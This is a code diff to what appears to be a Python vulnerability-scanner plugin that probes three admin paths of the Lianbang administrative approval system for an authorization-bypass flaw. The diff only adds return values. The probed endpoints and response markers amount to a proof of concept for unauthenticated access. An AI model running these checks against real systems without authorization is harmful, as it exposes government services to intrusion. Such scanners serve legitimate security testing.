@@ -27,21 +27,24 @@ class lianbang_multi_bypass_priv_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"tbPmSignOff" in req.text:
                 cprint("[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl, "red")
-
+                return True, vulnurl, "连邦行政审批系统越权漏洞", payload, req.text
             vulnurl = self.url + "/workplate/xzsp/lbsxdict/add.aspx"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"xksxid" in req.text:
                 cprint("[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl, "red")
-
+                return True, vulnurl, "连邦行政审批系统越权漏洞", payload, req.text
             vulnurl = self.url + "/workplate/base/operation/add.aspx"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"tbDescr" in req.text:
                 cprint("[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "连邦行政审批系统越权漏洞", payload, req.text
             else:
                 cprint("[-]不存在lianbang_multi_bypass_priv漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
